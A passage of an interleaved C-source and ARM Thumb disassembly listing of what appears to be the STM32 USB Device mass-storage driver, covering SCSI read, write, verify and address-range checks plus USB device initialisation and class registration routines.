 800ab34:	f7ff fba4 	bl	800a280 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800ab38:	f04f 33ff 	mov.w	r3, #4294967295
 800ab3c:	e015      	b.n	800ab6a <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800ab3e:	697b      	ldr	r3, [r7, #20]
 800ab40:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab44:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ab46:	697b      	ldr	r3, [r7, #20]
 800ab48:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab4c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ab4e:	7af9      	ldrb	r1, [r7, #11]
 800ab50:	68f8      	ldr	r0, [r7, #12]
 800ab52:	f000 f80e 	bl	800ab72 <SCSI_CheckAddressRange>
 800ab56:	4603      	mov	r3, r0
 800ab58:	2b00      	cmp	r3, #0
 800ab5a:	da02      	bge.n	800ab62 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800ab5c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab60:	e003      	b.n	800ab6a <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800ab62:	697b      	ldr	r3, [r7, #20]
 800ab64:	2200      	movs	r2, #0
 800ab66:	60da      	str	r2, [r3, #12]

  return 0;
 800ab68:	2300      	movs	r3, #0
}
 800ab6a:	4618      	mov	r0, r3
 800ab6c:	3718      	adds	r7, #24
 800ab6e:	46bd      	mov	sp, r7
 800ab70:	bd80      	pop	{r7, pc}

0800ab72 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800ab72:	b580      	push	{r7, lr}
 800ab74:	b086      	sub	sp, #24
 800ab76:	af00      	add	r7, sp, #0
 800ab78:	60f8      	str	r0, [r7, #12]
 800ab7a:	607a      	str	r2, [r7, #4]
 800ab7c:	603b      	str	r3, [r7, #0]
 800ab7e:	460b      	mov	r3, r1
 800ab80:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab82:	68fb      	ldr	r3, [r7, #12]
 800ab84:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab88:	68fb      	ldr	r3, [r7, #12]
 800ab8a:	32b0      	adds	r2, #176	; 0xb0
 800ab8c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab90:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab92:	697b      	ldr	r3, [r7, #20]
 800ab94:	2b00      	cmp	r3, #0
 800ab96:	d102      	bne.n	800ab9e <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ab98:	f04f 33ff 	mov.w	r3, #4294967295
 800ab9c:	e012      	b.n	800abc4 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ab9e:	687a      	ldr	r2, [r7, #4]
 800aba0:	683b      	ldr	r3, [r7, #0]
 800aba2:	441a      	add	r2, r3
 800aba4:	697b      	ldr	r3, [r7, #20]
 800aba6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abaa:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800abac:	429a      	cmp	r2, r3
 800abae:	d908      	bls.n	800abc2 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800abb0:	7af9      	ldrb	r1, [r7, #11]
 800abb2:	2321      	movs	r3, #33	; 0x21
 800abb4:	2205      	movs	r2, #5
 800abb6:	68f8      	ldr	r0, [r7, #12]
 800abb8:	f7ff fb62 	bl	800a280 <SCSI_SenseCode>
    return -1;
 800abbc:	f04f 33ff 	mov.w	r3, #4294967295
 800abc0:	e000      	b.n	800abc4 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800abc2:	2300      	movs	r3, #0
}
 800abc4:	4618      	mov	r0, r3
 800abc6:	3718      	adds	r7, #24
 800abc8:	46bd      	mov	sp, r7
 800abca:	bd80      	pop	{r7, pc}

0800abcc <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800abcc:	b590      	push	{r4, r7, lr}
 800abce:	b085      	sub	sp, #20
 800abd0:	af00      	add	r7, sp, #0
 800abd2:	6078      	str	r0, [r7, #4]
 800abd4:	460b      	mov	r3, r1
 800abd6:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800abd8:	687b      	ldr	r3, [r7, #4]
 800abda:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800abde:	687b      	ldr	r3, [r7, #4]
 800abe0:	32b0      	adds	r2, #176	; 0xb0
 800abe2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800abe6:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800abe8:	68fb      	ldr	r3, [r7, #12]
 800abea:	2b00      	cmp	r3, #0
 800abec:	d102      	bne.n	800abf4 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800abee:	f04f 33ff 	mov.w	r3, #4294967295
 800abf2:	e07b      	b.n	800acec <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800abf4:	68fb      	ldr	r3, [r7, #12]
 800abf6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abfa:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800abfc:	68fa      	ldr	r2, [r7, #12]
 800abfe:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac02:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ac06:	fb02 f303 	mul.w	r3, r2, r3
 800ac0a:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ac0c:	68bb      	ldr	r3, [r7, #8]
 800ac0e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ac12:	bf28      	it	cs
 800ac14:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ac18:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ac1a:	687b      	ldr	r3, [r7, #4]
 800ac1c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ac20:	687a      	ldr	r2, [r7, #4]
 800ac22:	33b0      	adds	r3, #176	; 0xb0
 800ac24:	009b      	lsls	r3, r3, #2
 800ac26:	4413      	add	r3, r2
 800ac28:	685b      	ldr	r3, [r3, #4]
 800ac2a:	691c      	ldr	r4, [r3, #16]
 800ac2c:	68fb      	ldr	r3, [r7, #12]
 800ac2e:	f103 0110 	add.w	r1, r3, #16
 800ac32:	68fb      	ldr	r3, [r7, #12]
 800ac34:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac38:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800ac3a:	68fb      	ldr	r3, [r7, #12]
 800ac3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac40:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac44:	4618      	mov	r0, r3
 800ac46:	68bb      	ldr	r3, [r7, #8]
 800ac48:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ac4c:	b29b      	uxth	r3, r3
 800ac4e:	78f8      	ldrb	r0, [r7, #3]
 800ac50:	47a0      	blx	r4
 800ac52:	4603      	mov	r3, r0
 800ac54:	2b00      	cmp	r3, #0
 800ac56:	da08      	bge.n	800ac6a <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800ac58:	78f9      	ldrb	r1, [r7, #3]
 800ac5a:	2311      	movs	r3, #17
 800ac5c:	2204      	movs	r2, #4
 800ac5e:	6878      	ldr	r0, [r7, #4]
 800ac60:	f7ff fb0e 	bl	800a280 <SCSI_SenseCode>
    return -1;
 800ac64:	f04f 33ff 	mov.w	r3, #4294967295
 800ac68:	e040      	b.n	800acec <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ac6a:	4b22      	ldr	r3, [pc, #136]	; (800acf4 <SCSI_ProcessRead+0x128>)
 800ac6c:	7819      	ldrb	r1, [r3, #0]
 800ac6e:	68fb      	ldr	r3, [r7, #12]
 800ac70:	f103 0210 	add.w	r2, r3, #16
 800ac74:	68bb      	ldr	r3, [r7, #8]
 800ac76:	6878      	ldr	r0, [r7, #4]
 800ac78:	f002 f8f4 	bl	800ce64 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ac7c:	68fb      	ldr	r3, [r7, #12]
 800ac7e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac82:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac84:	68fb      	ldr	r3, [r7, #12]
 800ac86:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac8a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac8e:	4619      	mov	r1, r3
 800ac90:	68bb      	ldr	r3, [r7, #8]
 800ac92:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac96:	4413      	add	r3, r2
 800ac98:	68fa      	ldr	r2, [r7, #12]
 800ac9a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac9e:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800aca0:	68fb      	ldr	r3, [r7, #12]
 800aca2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aca6:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800aca8:	68fb      	ldr	r3, [r7, #12]
 800acaa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acae:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800acb2:	4619      	mov	r1, r3
 800acb4:	68bb      	ldr	r3, [r7, #8]
 800acb6:	fbb3 f3f1 	udiv	r3, r3, r1
 800acba:	1ad3      	subs	r3, r2, r3
 800acbc:	68fa      	ldr	r2, [r7, #12]
 800acbe:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acc2:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800acc4:	68fb      	ldr	r3, [r7, #12]
 800acc6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acca:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800accc:	68bb      	ldr	r3, [r7, #8]
 800acce:	1ad3      	subs	r3, r2, r3
 800acd0:	68fa      	ldr	r2, [r7, #12]
 800acd2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acd6:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800acd8:	68fb      	ldr	r3, [r7, #12]
 800acda:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acde:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ace0:	2b00      	cmp	r3, #0
 800ace2:	d102      	bne.n	800acea <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ace4:	68fb      	ldr	r3, [r7, #12]
 800ace6:	2203      	movs	r2, #3
 800ace8:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800acea:	2300      	movs	r3, #0
}
 800acec:	4618      	mov	r0, r3
 800acee:	3714      	adds	r7, #20
 800acf0:	46bd      	mov	sp, r7
 800acf2:	bd90      	pop	{r4, r7, pc}
 800acf4:	2000010a 	.word	0x2000010a

0800acf8 <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800acf8:	b590      	push	{r4, r7, lr}
 800acfa:	b085      	sub	sp, #20
 800acfc:	af00      	add	r7, sp, #0
 800acfe:	6078      	str	r0, [r7, #4]
 800ad00:	460b      	mov	r3, r1
 800ad02:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ad04:	687b      	ldr	r3, [r7, #4]
 800ad06:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad0a:	687b      	ldr	r3, [r7, #4]
 800ad0c:	32b0      	adds	r2, #176	; 0xb0
 800ad0e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad12:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ad14:	68fb      	ldr	r3, [r7, #12]
 800ad16:	2b00      	cmp	r3, #0
 800ad18:	d102      	bne.n	800ad20 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ad1a:	f04f 33ff 	mov.w	r3, #4294967295
 800ad1e:	e08e      	b.n	800ae3e <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ad20:	68fb      	ldr	r3, [r7, #12]
 800ad22:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad26:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad28:	68fa      	ldr	r2, [r7, #12]
 800ad2a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad2e:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad32:	fb02 f303 	mul.w	r3, r2, r3
 800ad36:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ad38:	68bb      	ldr	r3, [r7, #8]
 800ad3a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ad3e:	bf28      	it	cs
 800ad40:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ad44:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ad46:	687b      	ldr	r3, [r7, #4]
 800ad48:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ad4c:	687a      	ldr	r2, [r7, #4]
 800ad4e:	33b0      	adds	r3, #176	; 0xb0
 800ad50:	009b      	lsls	r3, r3, #2
 800ad52:	4413      	add	r3, r2
 800ad54:	685b      	ldr	r3, [r3, #4]
 800ad56:	695c      	ldr	r4, [r3, #20]
 800ad58:	68fb      	ldr	r3, [r7, #12]
 800ad5a:	f103 0110 	add.w	r1, r3, #16
 800ad5e:	68fb      	ldr	r3, [r7, #12]
 800ad60:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad64:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800ad66:	68fb      	ldr	r3, [r7, #12]
 800ad68:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad6c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad70:	4618      	mov	r0, r3
 800ad72:	68bb      	ldr	r3, [r7, #8]
 800ad74:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ad78:	b29b      	uxth	r3, r3
 800ad7a:	78f8      	ldrb	r0, [r7, #3]
 800ad7c:	47a0      	blx	r4
 800ad7e:	4603      	mov	r3, r0
 800ad80:	2b00      	cmp	r3, #0
 800ad82:	da08      	bge.n	800ad96 <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800ad84:	78f9      	ldrb	r1, [r7, #3]
 800ad86:	2303      	movs	r3, #3
 800ad88:	2204      	movs	r2, #4
 800ad8a:	6878      	ldr	r0, [r7, #4]
 800ad8c:	f7ff fa78 	bl	800a280 <SCSI_SenseCode>
    return -1;
 800ad90:	f04f 33ff 	mov.w	r3, #4294967295
 800ad94:	e053      	b.n	800ae3e <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ad96:	68fb      	ldr	r3, [r7, #12]
 800ad98:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad9c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad9e:	68fb      	ldr	r3, [r7, #12]
 800ada0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ada4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ada8:	4619      	mov	r1, r3
 800adaa:	68bb      	ldr	r3, [r7, #8]
 800adac:	fbb3 f3f1 	udiv	r3, r3, r1
 800adb0:	4413      	add	r3, r2
 800adb2:	68fa      	ldr	r2, [r7, #12]
 800adb4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adb8:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800adba:	68fb      	ldr	r3, [r7, #12]
 800adbc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adc0:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800adc2:	68fb      	ldr	r3, [r7, #12]
 800adc4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adc8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800adcc:	4619      	mov	r1, r3
 800adce:	68bb      	ldr	r3, [r7, #8]
 800add0:	fbb3 f3f1 	udiv	r3, r3, r1
 800add4:	1ad3      	subs	r3, r2, r3
 800add6:	68fa      	ldr	r2, [r7, #12]
 800add8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800addc:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800adde:	68fb      	ldr	r3, [r7, #12]
 800ade0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ade4:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ade6:	68bb      	ldr	r3, [r7, #8]
 800ade8:	1ad3      	subs	r3, r2, r3
 800adea:	68fa      	ldr	r2, [r7, #12]
 800adec:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adf0:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800adf2:	68fb      	ldr	r3, [r7, #12]
 800adf4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adf8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800adfa:	2b00      	cmp	r3, #0
 800adfc:	d104      	bne.n	800ae08 <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800adfe:	2100      	movs	r1, #0
 800ae00:	6878      	ldr	r0, [r7, #4]
 800ae02:	f7fe fc53 	bl	80096ac <MSC_BOT_SendCSW>
 800ae06:	e019      	b.n	800ae3c <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800ae08:	68fb      	ldr	r3, [r7, #12]
 800ae0a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae0e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ae10:	68fa      	ldr	r2, [r7, #12]
 800ae12:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae16:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ae1a:	fb02 f303 	mul.w	r3, r2, r3
 800ae1e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ae22:	bf28      	it	cs
 800ae24:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ae28:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ae2a:	4b07      	ldr	r3, [pc, #28]	; (800ae48 <SCSI_ProcessWrite+0x150>)
 800ae2c:	7819      	ldrb	r1, [r3, #0]
 800ae2e:	68fb      	ldr	r3, [r7, #12]
 800ae30:	f103 0210 	add.w	r2, r3, #16
 800ae34:	68bb      	ldr	r3, [r7, #8]
 800ae36:	6878      	ldr	r0, [r7, #4]
 800ae38:	f002 f84c 	bl	800ced4 <USBD_LL_PrepareReceive>
  }

  return 0;
 800ae3c:	2300      	movs	r3, #0
}
 800ae3e:	4618      	mov	r0, r3
 800ae40:	3714      	adds	r7, #20
 800ae42:	46bd      	mov	sp, r7
 800ae44:	bd90      	pop	{r4, r7, pc}
 800ae46:	bf00      	nop
 800ae48:	2000010b 	.word	0x2000010b

0800ae4c <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800ae4c:	b480      	push	{r7}
 800ae4e:	b087      	sub	sp, #28
 800ae50:	af00      	add	r7, sp, #0
 800ae52:	60f8      	str	r0, [r7, #12]
 800ae54:	60b9      	str	r1, [r7, #8]
 800ae56:	4613      	mov	r3, r2
 800ae58:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800ae5a:	88fb      	ldrh	r3, [r7, #6]
 800ae5c:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800ae5e:	68fb      	ldr	r3, [r7, #12]
 800ae60:	2b00      	cmp	r3, #0
 800ae62:	d102      	bne.n	800ae6a <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800ae64:	f04f 33ff 	mov.w	r3, #4294967295
 800ae68:	e013      	b.n	800ae92 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800ae6a:	8afa      	ldrh	r2, [r7, #22]
 800ae6c:	68fb      	ldr	r3, [r7, #12]
 800ae6e:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800ae70:	e00b      	b.n	800ae8a <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800ae72:	8afb      	ldrh	r3, [r7, #22]
 800ae74:	3b01      	subs	r3, #1
 800ae76:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800ae78:	8afb      	ldrh	r3, [r7, #22]
 800ae7a:	68ba      	ldr	r2, [r7, #8]
 800ae7c:	441a      	add	r2, r3
 800ae7e:	8afb      	ldrh	r3, [r7, #22]
 800ae80:	7811      	ldrb	r1, [r2, #0]
 800ae82:	68fa      	ldr	r2, [r7, #12]
 800ae84:	4413      	add	r3, r2
 800ae86:	460a      	mov	r2, r1
 800ae88:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ae8a:	8afb      	ldrh	r3, [r7, #22]
 800ae8c:	2b00      	cmp	r3, #0
 800ae8e:	d1f0      	bne.n	800ae72 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ae90:	2300      	movs	r3, #0
}
 800ae92:	4618      	mov	r0, r3
 800ae94:	371c      	adds	r7, #28
 800ae96:	46bd      	mov	sp, r7
 800ae98:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ae9c:	4770      	bx	lr

0800ae9e <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800ae9e:	b580      	push	{r7, lr}
 800aea0:	b086      	sub	sp, #24
 800aea2:	af00      	add	r7, sp, #0
 800aea4:	60f8      	str	r0, [r7, #12]
 800aea6:	60b9      	str	r1, [r7, #8]
 800aea8:	4613      	mov	r3, r2
 800aeaa:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800aeac:	68fb      	ldr	r3, [r7, #12]
 800aeae:	2b00      	cmp	r3, #0
 800aeb0:	d101      	bne.n	800aeb6 <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800aeb2:	2303      	movs	r3, #3
 800aeb4:	e01f      	b.n	800aef6 <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800aeb6:	68fb      	ldr	r3, [r7, #12]
 800aeb8:	2200      	movs	r2, #0
 800aeba:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800aebe:	68fb      	ldr	r3, [r7, #12]
 800aec0:	2200      	movs	r2, #0
 800aec2:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800aec6:	68fb      	ldr	r3, [r7, #12]
 800aec8:	2200      	movs	r2, #0
 800aeca:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800aece:	68bb      	ldr	r3, [r7, #8]
 800aed0:	2b00      	cmp	r3, #0
 800aed2:	d003      	beq.n	800aedc <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800aed4:	68fb      	ldr	r3, [r7, #12]
 800aed6:	68ba      	ldr	r2, [r7, #8]
 800aed8:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800aedc:	68fb      	ldr	r3, [r7, #12]
 800aede:	2201      	movs	r2, #1
 800aee0:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800aee4:	68fb      	ldr	r3, [r7, #12]
 800aee6:	79fa      	ldrb	r2, [r7, #7]
 800aee8:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800aeea:	68f8      	ldr	r0, [r7, #12]
 800aeec:	f001 fdb6 	bl	800ca5c <USBD_LL_Init>
 800aef0:	4603      	mov	r3, r0
 800aef2:	75fb      	strb	r3, [r7, #23]

  return ret;
 800aef4:	7dfb      	ldrb	r3, [r7, #23]
}
 800aef6:	4618      	mov	r0, r3
 800aef8:	3718      	adds	r7, #24
 800aefa:	46bd      	mov	sp, r7
 800aefc:	bd80      	pop	{r7, pc}

0800aefe <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800aefe:	b580      	push	{r7, lr}
 800af00:	b084      	sub	sp, #16
 800af02:	af00      	add	r7, sp, #0
 800af04:	6078      	str	r0, [r7, #4]
 800af06:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800af08:	2300      	movs	r3, #0
 800af0a:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800af0c:	683b      	ldr	r3, [r7, #0]
 800af0e:	2b00      	cmp	r3, #0
 800af10:	d101      	bne.n	800af16 <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800af12:	2303      	movs	r3, #3
 800af14:	e025      	b.n	800af62 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800af16:	687b      	ldr	r3, [r7, #4]
 800af18:	683a      	ldr	r2, [r7, #0]
 800af1a:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800af1e:	687b      	ldr	r3, [r7, #4]
 800af20:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800af24:	687b      	ldr	r3, [r7, #4]
 800af26:	32ae      	adds	r2, #174	; 0xae
 800af28:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
